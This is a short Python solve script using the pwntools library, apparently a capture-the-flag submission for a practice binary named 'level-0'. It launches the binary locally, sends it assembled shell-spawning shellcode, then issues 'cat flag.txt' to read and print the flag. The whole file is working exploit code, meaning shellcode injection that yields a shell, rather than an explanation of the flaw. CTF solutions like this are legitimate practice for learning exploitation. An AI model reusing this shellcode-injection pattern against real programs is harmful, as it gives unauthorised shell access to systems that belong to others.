#!/usr/bin/env python3

'''
WhatTheFuzz's submission for level-0, a random pwnable passed down from
@huckfinn.

This script can be used in the following manner:
python3 ./solve.py

Returns:
    The flag to solve the challenge.
'''

from pwn import *

exe = ELF('./level-0')

context.binary = exe
context.log_level = 'info'
context.terminal = ['gnome-terminal', '-e']

def conn():
    '''Establish the connection to the process.
    '''

    io = process([exe.path])
    return io

def gen_shellcode():
    '''Create the shellcode we need to spawn a shell.
    Return the assembly as a byte string.
    '''
    # Create the shellcode.
    shellcode = shellcraft.sh()

    # Return the assembly.
    return asm(shellcode)


def main():
    '''Return the flag.
    '''

    with conn() as io:

        # Create the shellcode.
        shellcode = gen_shellcode()
        io.sendline(shellcode)

        # Get the flag.
        io.sendline("cat flag.txt")
        flag = io.recvline()
        log.success(f"Flag: {flag}")

        return flag


if __name__ == '__main__':
    main()

